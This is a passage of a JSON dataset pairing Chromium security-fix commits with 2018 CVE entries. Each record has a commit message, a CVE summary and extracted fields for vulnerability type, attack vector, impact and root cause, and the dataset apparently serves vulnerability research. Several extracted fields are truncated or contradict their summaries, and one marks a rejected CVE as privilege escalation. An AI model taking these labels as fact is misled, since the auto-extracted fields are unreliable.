page.","commit_message_1":"disallow access to opaque cs response","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"leak cross - origin data","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"4391ff2884fe15b8d609bd6d3af61aacf8ad52a1","cve_id":"CVE-2018-6165","cwe_id":null,"commit_message":"Preserve renderer-initiated bit when reloading in a new process.\n\nBUG=847718\nTEST=See bug for repro steps.\n\nChange-Id: I6c3461793fbb23f1a4d731dc27b4e77312f29227\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1080235\nCommit-Queue: Charlie Reis <creis@chromium.org>\nReviewed-by: Nasko Oskov <nasko@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#563312}","summary":"Incorrect handling of reloads in Navigation in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"preserve renderer-initiated bit when reloading in a new process","Vulnerability Type":"incorrect handling","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"f8bc31acf099873ebc623e92908477f2e99c17f6","cve_id":"CVE-2018-6166","cwe_id":null,"commit_message":"Add a few more confusability mapping entries\n\nU+0153(\u0153) => ce\nU+00E6(\u00e6), U+04D5 (\u04d5) => ae\nU+0499(\u0499) => 3\nU+0525(\u0525) => n\n\nBug: 835554, 826019, 836885\nTest: components_unittests --gtest_filter=*IDN*\nChange-Id: Ic89211f70359d3d67cc25c1805b426b72cdb16ae\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1055894\nCommit-Queue: Jungshik Shin <jshin@chromium.org>\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#558928}","summary":"Incorrect handling of confusable characters in URL Formatter in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to perform domain spoofing via IDN homographs via a crafted domain name.","commit_message_1":"add a few more confusability mapping entry","Vulnerability Type":"incorrect handling","Attack Vector":"via a crafted html page","Impact":"perform domain spoofing via idn homo","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"8ac035c31d42cedcc2a772d7765622dc9f406240","cve_id":"CVE-2018-6167","cwe_id":null,"commit_message":"Add Lao\/Thai spoofable entries\n\n\n    U+0E1E (\u0e1e) => w\n    U+0E9E (\u0e9e) => w\n    U+0E9F (\u0e9f) => w\n\n    U+0EA3 (\u0ea3) => s\n    U+0EAE (\u0eae) => s\n\n    U+0E1A (\u0e1a) => u\n    U+0E9A (\u0e9a) => u\n\n    Note that U+0E1F(\u0e1f) and U+0E23 (\u0e23) were added a while ago.\n\nBUG=833143\nTEST=components_unittests --gtest_filter=*IDN*\n\nChange-Id: I882e7d272cdca1d80aa23be94b4d7906ff8653c1\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1058710\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCommit-Queue: Jungshik Shin <jshin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#562565}","summary":"Incorrect handling of confusable characters in URL Formatter in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to perform domain spoofing via IDN homographs via a crafted domain name.","commit_message_1":"add lao\/thai spoofable entry u+0e1e ( \u0e1e ) = > w u+0e9e ( \u0e9e ) = > w u+0e9f ( \u0e9f ) = > w u+0ea3 ( \u0ea3 ) = > s u+0eae ( \u0eae ) = > s u+0e1a ( \u0e1a ) = > u u+0e9a ( \u0e9a ) = > u note that u+0e1f ( \u0e1f ) and u+0e23 ( \u0e23 ) were added a while ago","Vulnerability Type":"incorrect handling","Attack Vector":"via a crafted html page","Impact":"perform domain spoofing via idn homo","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"c9450503817e3575a8acb049371b592863e6d555","cve_id":"CVE-2018-6168","cwe_id":"CWE-200","commit_message":"Disable metalayer tool when assistant is not available\n\nBUG=b:68664196\nTEST=unit tests and manually check on device\n\nChange-Id: If4c997a048ffc7ec3afa3e9ab2199f8c2b140c7a\nReviewed-on: https:\/\/chromium-review.googlesource.com\/828265\nReviewed-by: Vladislav Kaznacheev <kaznacheev@chromium.org>\nReviewed-by: Jenny Zhang <jennyz@chromium.org>\nCommit-Queue: Xiaohui Chen <xiaohuic@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#524881}","summary":"Information leak in media engine in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to obtain potentially sensitive information from process memory via a crafted HTML page.","commit_message_1":"disable metalayer tool when assistant is not available","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"obtain potentially sensitive information from process memory","Root Cause":"caused by a CORS bypass","Attack Type":"remote attacker"},{"commit_id":"303d78445257d1eec726c4ebadb3517cb16c8c09","cve_id":"CVE-2018-6169","cwe_id":"CWE-20","commit_message":"[Extensions UI] Initially disabled OK button for extension install prompts and enable them after a 500 ms time period.\n\nBUG=394518\n\nReview-Url: https:\/\/codereview.chromium.org\/2716353003\nCr-Commit-Position: refs\/heads\/master@{#461933}","summary":"Lack of timeout on extension install prompt in Extensions in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to trigger installation of an unwanted extension via a crafted HTML page.","commit_message_1":"initially disabled ok button for extension install prompt and enable them after a <number> m time period","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"trigger installation of an unwanted extension","Root Cause":"caused by a permissions bypass","Attack Type":"remote attacker"},{"commit_id":"c5c6320f80159dc41dffc3cfbf0298925c7dcf1b","cve_id":"CVE-2018-6171","cwe_id":"CWE-416","commit_message":"chrome.bluetoothSocket: Fix regression in send()\n\nIn https:\/\/crrev.com\/c\/997098, params_ was changed to a local variable,\nbut it needs to last longer than that since net::WrappedIOBuffer may use\nthe data after the local variable goes out of scope.\n\nThis CL changed it back to be an instance variable.\n\nBug: 851799\nChange-Id: I392f8acaef4c6473d6ea4fbee7209445aa09112e\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1103676\nReviewed-by: Toni Barzic <tbarzic@chromium.org>\nCommit-Queue: Sonny Sasaka <sonnysasaka@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#568137}","summary":"Use after free in Bluetooth in Google Chrome prior to 68.0.3440.75 allowed an attacker who convinced a user to install a malicious extension to obtain potentially sensitive information from process memory via a crafted Chrome Extension.","commit_message_1":"fix regression in send ( ) in http : \/\/<file>\/c\/<number> , params_ wa changed to a local variable , but it need to last longer than that since net : :wrappediobuffer may use the data after the local variable go out of scope","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted chrome extension","Impact":"install a malicious extension to obtain potentially sensitive information from process memory","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"4504a474c069d07104237d0c03bfce7b29a42de6","cve_id":"CVE-2018-6177","cwe_id":"CWE-200","commit_message":"defeat cors attacks on audio\/video tags\n\nNeutralize error messages and fire no progress events\nuntil media metadata has been loaded for media loaded\nfrom cross-origin locations.\n\nBug: 828265, 826187\nChange-Id: Iaf15ef38676403687d6a913cbdc84f2d70a6f5c6\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1015794\nReviewed-by: Mounir Lamouri <mlamouri@chromium.org>\nReviewed-by: Dale Curtis <dalecurtis@chromium.org>\nCommit-Queue: Fredrik Hubinette <hubbe@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#557312}","summary":"Information leak in media engine in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to leak cross-origin data via a crafted HTML page.","commit_message_1":"defeat cors attack on audio\/video tag neutralize error message and fire no progress event until medium metadata ha been loaded for medium loaded from cross-origin location","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"leak cross - origin data","Root Cause":"caused by a cross-origin leak","Attack Type":"remote attacker"},{"commit_id":"fbeba958bb83c05ec8cc54e285a4a9ca10d1b311","cve_id":"CVE-2018-6178","cwe_id":"CWE-254","commit_message":"Allow to specify elide behavior for confrim infobar message\n\nUsed in \"<extension name> is debugging this browser\" infobar.\n\nBug: 823194\nChange-Id: Iff6627097c020cccca8f7cc3e21a803a41fd8f2c\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1048064\nCommit-Queue: Dmitry Gozman <dgozman@chromium.org>\nReviewed-by: Devlin <rdevlin.cronin@chromium.org>\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#557245}","summary":"Eliding from the wrong side in an infobar in DevTools in Google Chrome prior to 68.0.3440.75 allowed an attacker who convinced a user to install a malicious extension to Hide Chrome Security UI via a crafted Chrome Extension.","commit_message_1":"allow to specify elide behavior for confrim infobar message used in `` < extension name > is debugging this browser '' infobar","Vulnerability Type":"Security Features","Attack Vector":"via a crafted chrome extension","Impact":"install a malicious extension to hide chrome security ui","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"53d030a18b1965c20878d6300738ed29c3bfdd08","cve_id":"CVE-2018-6044","cwe_id":null,"commit_message":"Network servicification: Plumb ResourceContext through WebRequestProxyingURLLoaderFactory.\n\nThis CL plumbs the ResourceContext to the WebRequestInfo structure through\nWebRequestProxyingURLLoaderFactory. This is necessary to fix\nNTPInterceptionWebRequestAPITest.NTPRendererRequestsHidden for the network\nservicification path.\n\nBUG=797461, 721414\n\nCq-Include-Trybots: master.tryserver.chromium.linux:linux_mojo\nChange-Id: I2957c1ece0f8f7b44f15156aeb5e554b3a91ff01\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1029549\nReviewed-by: Ken Rockot <rockot@chromium.org>\nCommit-Queue: Karan Bhatia <karandeepb@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#554556}","summary":"Rejected reason: DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: CVE-2018-16064. Reason: This candidate is a reservation duplicate of CVE-2018-16064. Notes: All CVE users should reference CVE-2018-16064 instead of this candidate. All references and descriptions in this candidate have been removed to prevent accidental usage","commit_message_1":"plumb resourcecontext through webrequestproxyingurlloaderfactory","Vulnerability Type":"BUG","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"gain elevated privileges","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"a62f913109fc1566230f5963bbf69ee65274ebc8","cve_id":"CVE-2018-4117","cwe_id":"CWE-200","commit_message":"[Fetch API] Fix redirect leak on \"no-cors\" requests\n\nThe spec issue is now fixed, and this CL follows the spec change[1].\n\n1: https:\/\/github.com\/whatwg\/fetch\/commit\/14858d3e9402285a7ff3b5e47a22896ff3adc95d\n\nBug: 791324\nChange-Id: Ic3e3955f43578b38fc44a5a6b2a1b43d56a2becb\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1023613\nReviewed-by: Tsuyoshi Horo <horo@chromium.org>\nCommit-Queue: Yutaka Hirano <yhirano@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#552964}","summary":"An issue was discovered in certain Apple products. iOS before 11.3 is affected. Safari before 11.1 is affected. iCloud before 7.4 on Windows is affected. iTunes before 12.7.4 on Windows is affected. watchOS before 4.3 is affected. The issue involves the fetch API in the *WebKit* component. It allows remote attackers to bypass the Same Origin Policy and obtain sensitive information via a crafted web site.","commit_message_1":"fix redirect leak on `` no-cors '' request the spec issue is now fixed , and this cl follows the spec change [ <number> ]","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted web site","Impact":"bypass the same origin policy and obtain sensitive information","Root Cause":"caused by a cross-origin issue with the fetch API","Attack Type":"remote attacker"},{"commit_id":"cbb2c0940d4e3914ccd74f6466ff4cb9e50e0e86","cve_id":"CVE-2018-6151","cwe_id":"CWE-125","commit_message":"Don't downcast DownloadManagerDelegate to ChromeDownloadManagerDelegate.\n\nDownloadManager has public SetDelegate method and tests and or other subsystems\ncan install their own implementations of the delegate.\n\nBug: 805905\nChange-Id: Iecf1e0aceada0e1048bed1e2d2ceb29ca64295b8\nTBR: tests updated to follow the API change.\nReviewed-on: https:\/\/chromium-review.googlesource.com\/894702\nReviewed-by: David Vallet <dvallet@chromium.org>\nReviewed-by: Min Qin <qinmin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#533515}","summary":"Bad cast in DevTools in Google Chrome on Win, Linux, Mac, Chrome OS prior to 66.0.3359.117 allowed an attacker who convinced a user to install a malicious extension to perform an out of bounds memory read via a crafted Chrome Extension.","commit_message_1":"do n't downcast downloadmanagerdelegate to chromedownloadmanagerdelegate","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted chrome extension","Impact":"install a malicious extension to perform an out of bounds memory read","Root Cause":"caused by a bad cast","Attack Type":"remote attacker"},{"commit_id":"81ad563077484d112e544347da87c09dd2ba0af8","cve_id":"CVE-2018-6152","cwe_id":null,"commit_message":"Always mark content downloaded by devtools delegate as potentially dangerous\n\nBug: 805445\nChange-Id: I7051f519205e178db57e23320ab979f8fa9ce38b\nReviewed-on: https:\/\/chromium-review.googlesource.com\/894782\nCommit-Queue: David Vallet <dvallet@chromium.org>\nReviewed-by: Pavel Feldman <pfeldman@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#533215}","summary":"The implementation of the Page.downloadBehavior backend unconditionally marked downloaded files as safe, regardless of file type in Google Chrome prior to 66.0.3359.117 allowed an attacker who convinced a user to install a malicious extension to potentially perform a sandbox escape via a crafted HTML page and user interaction.","commit_message_1":"always mark content downloaded by devtools delegate a potentially dangerous","Vulnerability Type":"unspecified","Attack Vector":"via a crafted html page and user interaction","Impact":"install a malicious extension to potentially perform a sandbox escape","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"2bf635c28effa427a270f4fc45df84ed344f411c","cve_id":"CVE-2018-16066","cwe_id":"CWE-416","commit_message":"Do not crash while reentrantly appending to style element.\n\nWhen a node is inserted into a container, it is notified via\n::InsertedInto. However, a node may request a second notification via\nDidNotifySubtreeInsertionsToDocument, which occurs after all the children\nhave been notified as well. *StyleElement is currently using this\nsecond notification.\n\nThis causes a problem, because *ScriptElement is using the same mechanism,\nwhich in turn means that scripts can execute before the state of\n*StyleElements are properly updated.\n\nThis patch avoids ::DidNotifySubtreeInsertionsToDocument, and instead\nprocesses the stylesheet in ::InsertedInto. The original reason for using\n::DidNotifySubtreeInsertionsToDocument in the first place appears to be\ninvalid now, as the test case is still passing.\n\nR=futhark@chromium.org, hayato@chromium.org\n\nBug: 853709, 847570\nCq-Include-Trybots: luci.chromium.try:linux_layout_tests_slimming_paint_v2;master.tryserver.blink:linux_trusty_blink_rel\nChange-Id: Ic0b5fa611044c78c5745cf26870a747f88920a14\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1104347\nCommit-Queue: Anders Ruud <andruud@chromium.org>\nReviewed-by: Rune Lillesveen <futhark@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#568368}","summary":"A use after free in Blink in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"do not crash while reentrantly appending to style element","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"ca1156974cbe707fd023a00ae62104528833a44e","cve_id":"CVE-2018-16067","cwe_id":"CWE-416","commit_message":"Audio thread should not access destination node\n\nThe AudioDestinationNode is an object managed by Oilpan so the audio\nthread should not access it.  However, the audio thread needs\ninformation (currentTime, etc) from the destination node. So instead\nof accessing the audio destination handler (a scoped_refptr) via the\ndestination node, add a new member to the base audio context that\nholds onto the destination handler.\n\nThe destination handler is not an oilpan object and lives at least as\nlong as the base audio context.\n\nBug: 860626, 860522, 863951\nTest: Test case from 860522 doesn't crash on asan build\nChange-Id: I3add844d4eb8fdc7e05b89292938b843a0abbb99\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1138974\nCommit-Queue: Raymond Toy <rtoy@chromium.org>\nReviewed-by: Hongchan Choi <hongchan@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#575509}","summary":"A use after free in WebAudio in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"audio thread should not access destination node the audiodestinationnode is an object managed by oilpan so the audio thread should not access it","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"66e24a8793615bd9d5c238b1745b093090e1f72d","cve_id":"CVE-2018-16068","cwe_id":"CWE-20","commit_message":"[mojo-core] Validate data pipe endpoint metadata\n\nEnsures that we don't blindly trust specified buffer size and offset\nmetadata when deserializing data pipe consumer and producer handles.\n\nBug: 877182\nChange-Id: I30f3eceafb5cee06284c2714d08357ef911d6fd9\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1192922\nReviewed-by: Reilly Grant <reillyg@chromium.org>\nCommit-Queue: Ken Rockot <rockot@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#586704}","summary":"Missing validation in Mojo in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to potentially perform a sandbox escape via a crafted HTML page.","commit_message_1":"validate data pipe endpoint metadata ensures that we do n't blindly trust specified buffer size and offset metadata when deserializing data pipe consumer and producer handle","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"potentially perform a sandbox escape","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"153f8457c7867d5c9b627c11b52f5de0671d2fff","cve_id":"CVE-2018-16072","cwe_id":"CWE-346","commit_message":"Fix HasSingleSecurityOrigin for HLS\n\nHLS manifests can request segments from a different origin than the\noriginal manifest's origin. We do not inspect HLS manifests within\nChromium, and instead delegate to Android's MediaPlayer. This means we\nneed to be conservative, and always assume segments might come from a\ndifferent origin. HasSingleSecurityOrigin should always return false\nwhen decoding HLS.\n\nBug: 864283\nChange-Id: Ie16849ac6f29ae7eaa9caf342ad0509a226228ef\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1142691\nReviewed-by: Dale Curtis <dalecurtis@chromium.org>\nReviewed-by: Dominick Ng <dominickn@chromium.org>\nCommit-Queue: Thomas Guilbert <tguilbert@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#576378}","summary":"A missing origin check related to HLS manifests in Blink in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to bypass same origin policy via a crafted HTML page.","commit_message_1":"fix hassinglesecurityorigin for hl hl manifest can request segment from a different origin than the original manifest 's origin","Vulnerability Type":"Origin Validation Error","Attack Vector":"via a crafted html page .","Impact":"bypass same origin policy","Root Cause":"caused by a cross-origin pixel leak","Attack Type":"remote attacker"},{"commit_id":"0bb3f5c715eb66bb5c1fb05fd81d902ca57f33ca","cve_id":"CVE-2018-16073","cwe_id":"CWE-285","commit_message":"Use unique processes for data URLs on restore.\n\nData URLs are usually put into the process that created them, but this\ninfo is not tracked after a tab restore.  Ensure that they do not end up\nin the parent frame's process (or each other's process), in case they\nare malicious.\n\nBUG=863069\n\nChange-Id: Ib391f90c7bdf28a0a9c057c5cc7918c10aed968b\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1150767\nReviewed-by: Alex Moshchuk <alexmos@chromium.org>\nReviewed-by: Lei Zhang <thestig@chromium.org>\nCommit-Queue: Charlie Reis <creis@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#581023}","summary":"Insufficient policy enforcement in site isolation in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to bypass site isolation via a crafted HTML page.","commit_message_1":"use unique process for data url on restore","Vulnerability Type":"insufficient policy enforcement","Attack Vector":"via a crafted html page .","Impact":"bypass site isolation","Root Cause":"caused by a site isolation bypass after tab restore","Attack Type":"remote attacker"},{"commit_id":"b1f87486936ca0d6d9abf4d3b9b423a9c976fd59","cve_id":"CVE-2018-16074","cwe_id":"CWE-285","commit_message":"Avoid sharing process for blob URLs with null origin.\n\nPreviously, when a frame with a unique origin, such as from a data\nURL, created a blob URL, the blob URL looked like blob:null\/guid and\nresulted in a site URL of \"blob:\" when navigated to.  This incorrectly\nallowed all such blob URLs to share a process, even if they were\ncreated by different sites.\n\nThis CL changes the site URL assigned in such cases to be the full\nblob URL, which includes the GUID.  This avoids process sharing for\nall blob URLs with unique origins.\n\nThis fix is conservative in the sense that it would also isolate\ndifferent blob URLs created by the same unique origin from each other.\nThis case isn't expected to be common, so it's unlikely to affect\nprocess count.  There's ongoing work to maintain a GUID for unique\norigins, so longer-term, we could try using that to track down the\ncreator and potentially use that GUID in the site URL instead of the\nblob URL's GUID, to avoid unnecessary process isolation in scenarios\nlike this.\n\nNote that as part of this, we discovered a bug where data URLs aren't\nable to script blob URLs that they create: https:\/\/crbug.com\/865254.\nThis scripting bug should be fixed independently of this CL, and as\nfar as we can tell, this CL doesn't regress scripting cases like this\nfurther.\n\nBug: 863623\nChange-Id: Ib50407adbba3d5ee0cf6d72d3df7f8d8f24684ee\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1142389\nCommit-Queue: Alex Moshchuk <alexmos@chromium.org>\nReviewed-by: Charlie Reis <creis@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#576318}","summary":"Insufficient policy enforcement in site isolation in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to bypass site isolation via a crafted HTML page.","commit_message_1":"avoid sharing process for blob url with null origin","Vulnerability Type":"insufficient policy enforcement","Attack Vector":"via a crafted html page .","Impact":"bypass site isolation","Root Cause":"caused by a site isolation bypass using Blob URLS","Attack Type":"remote attacker"},{"commit_id":"d913f72b4875cf0814fc3f03ad7c00642097c4a4","cve_id":"CVE-2018-16075","cwe_id":"CWE-254","commit_message":"Remove RequireCSSExtensionForFile runtime enabled flag.\n\nThe feature has long since been stable (since M64) and doesn't seem\nto be a need for this flag.\n\nBUG=788936\n\nChange-Id: I666390b869289c328acb4a2daa5bf4154e1702c0\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1324143\nReviewed-by: Mike West <mkwst@chromium.org>\nReviewed-by: Camille Lamy <clamy@chromium.org>\nCommit-Queue: Dave Tapuska <dtapuska@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#607329}","summary":"Insufficient file type enforcement in Blink in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to obtain local file data via a crafted HTML page.","commit_message_1":"remove requirecssextensionforfile runtime enabled flag","Vulnerability Type":"Security Features","Attack Vector":"via a crafted html page","Impact":"obtain local file data","Root Cause":"caused by local file access","Attack Type":"remote attacker"},{"commit_id":"01a6365651e0b1e9896b251411a18a4ab5a4306d","cve_id":"CVE-2018-16087","cwe_id":null,"commit_message":"Don't reset TabDownloadState on history back\/forward\n\nCurrently performing forward\/backward on a tab will reset the TabDownloadState.\nWhich allows javascript code to do trigger multiple downloads.\nThis CL disables that behavior by not resetting the TabDownloadState on\nforward\/back.\nIt is still possible to reset the TabDownloadState through user gesture\nor using browser initiated download.\n\nBUG=848535\n\nChange-Id: I7f9bf6e8fb759b4dcddf5ac0c214e8c6c9f48863\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1108959\nCommit-Queue: Min Qin <qinmin@chromium.org>\nReviewed-by: Xing Liu <xingliu@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#574437}","summary":"Lack of proper state tracking in Permissions in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to bypass navigation restrictions via a crafted HTML page.","commit_message_1":"do n't reset tabdownloadstate on history back\/forward currently performing forward\/backward on a tab will reset the tabdownloadstate","Vulnerability Type":"lack of proper state tracking","Attack Vector":"via a crafted html page","Impact":"bypass navigation restrictions","Root Cause":"caused by multiple download restriction bypass","Attack Type":"remote attacker"},{"commit_id":"4379a7fcff8190aa7ba72307b398161c32102c52","cve_id":"CVE-2018-16088","cwe_id":null,"commit_message":"Only allow downloading in response to real keyboard modifiers\n\nBUG=848531\n\nChange-Id: I97554c8d312243b55647f1376945aee32dbd95bf\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1082216\nReviewed-by: Mike West <mkwst@chromium.org>\nCommit-Queue: Jochen Eisinger <jochen@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#564051}","summary":"A missing check for JS-simulated input events in Blink in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to download arbitrary files with no user input via a crafted HTML page.","commit_message_1":"only allow downloading in response to real keyboard modifier","Vulnerability Type":"missing check ","Attack Vector":"via a crafted html page","Impact":"download arbitrary files with no user input","Root Cause":"caused by a user gesture requirement bypass","Attack Type":"remote attacker"},{"commit_id":"90f878780cce9c4b0475fcea14d91b8f510cce11","cve_id":"CVE-2018-16077","cwe_id":"CWE-285","commit_message":"Prevent sandboxed documents from reusing the default window\n\nBug: 377995\nChange-Id: Iff66c6d214dfd0cb7ea9c80f83afeedfff703541\nReviewed-on: https:\/\/chromium-review.googlesource.com\/983558\nCommit-Queue: Andy Paicu <andypaicu@chromium.org>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#567663}","summary":"Object lifecycle issue in Blink in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to bypass content security policy via a crafted HTML page.","commit_message_1":"prevent sandboxed document from reusing the default window","Vulnerability Type":"object lifecycle","Attack Vector":"via a crafted html page .","Impact":"bypass content security policy","Root Cause":"caused by a content security policy bypass","Attack Type":"remote attacker"},{"commit_id":"b025e82307a8490501bb030266cd955c391abcb7","cve_id":"CVE-2018-16078","cwe_id":null,"commit_message":"[AF] Don't simplify\/dedupe suggestions for (partially) filled sections.\n\nSince Autofill does not fill field by field anymore, this simplifying\nand deduping of suggestions is not useful anymore.\n\nBug: 858820\nCq-Include-Trybots: luci.chromium.try:ios-simulator-full-configs;master.tryserver.chromium.mac:ios-simulator-cronet\nChange-Id: I36f7cfe425a0bdbf5ba7503a3d96773b405cc19b\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1128255\nReviewed-by: Roger McFarlane <rogerm@chromium.org>\nCommit-Queue: Sebastien Seguin-Gagnon <sebsg@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#573315}","summary":"Unsafe handling of credit card details in Autofill in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to obtain potentially sensitive information from process memory via a crafted HTML page.","commit_message_1":"do n't simplify\/dedupe suggestion for ( partially ) filled section","Vulnerability Type":"unsafe handling","Attack Vector":"via a crafted html page","Impact":"obtain potentially sensitive information from process memory","Root Cause":"caused by a credit card information leak","Attack Type":"remote attacker"},{"commit_id":"2c6ce192cb3fb7bfbc3f3f862926dcb65c3891b4","cve_id":"CVE-2018-16079","cwe_id":"CWE-362","commit_message":"Ensure device choosers are closed on navigation\n\nThe requestDevice() IPCs can race with navigation. This change ensures\nthat choosers are closed on navigation and adds browser tests to\nexercise this for Web Bluetooth and WebUSB.\n\nBug: 723503\nChange-Id: I66760161220e17bd2be9309cca228d161fe76e9c\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1099961\nCommit-Queue: Reilly Grant <reillyg@chromium.org>\nReviewed-by: Michael Wasserman <msw@chromium.org>\nReviewed-by: Jeffrey Yasskin <jyasskin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#569900}","summary":"A race condition between permission prompts and navigations in Prompts in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"ensure device chooser are closed on navigation the requestdevice ( ) ipcs can race with navigation","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"c552cd7b8a0862f6b3c8c6a07f98bda3721101eb","cve_id":"CVE-2018-16080","cwe_id":"CWE-20","commit_message":"Mac: turn popups into new tabs while in fullscreen.\n\nIt's platform convention to show popups as new tabs while in\nnon-HTML5 fullscreen. (Popups cause tabs to lose HTML5 fullscreen.)\n\nThis was implemented for Cocoa in a BrowserWindow override, but\nit makes sense to just stick it into Browser and remove a ton\nof override code put in just to support this.\n\nBUG=858929, 868416\nTEST=as in bugs\n\nChange-Id: I43471f242813ec1159d9c690bab73dab3e610b7d\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1153455\nReviewed-by: Sidney San Mart\u00edn <sdy@chromium.org>\nCommit-Queue: Avi Drissman <avi@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#578755}","summary":"A missing check for popup window handling in Fullscreen in Google Chrome on macOS prior to 69.0.3497.81 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"turn popups into new tab while in fullscreen","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"7c3bb2970fd0890df611b1d8b345b60b1978c2d7","cve_id":"CVE-2018-16081","cwe_id":"CWE-862","commit_message":"Take default system font size from PlatformFont\n\nThe default font returned by Skia should take the initial size from the\ndefault value kDefaultBaseFontSize specified in PlatformFont.\n\nR=robliao@chromium.org, asvitkine@chromium.org\nCC=benck@google.com\n\nBug: 944227\nChange-Id: I6b230b80c349abbe5968edb3cebdd6e89db4c4a6\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1642738\nReviewed-by: Robert Liao <robliao@chromium.org>\nReviewed-by: Alexei Svitkine <asvitkine@chromium.org>\nCommit-Queue: Etienne Bergeron <etienneb@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#666299}","summary":"Allowing the chrome.debugger API to run on file:\/\/ URLs in DevTools in Google Chrome prior to 69.0.3497.81 allowed an attacker who 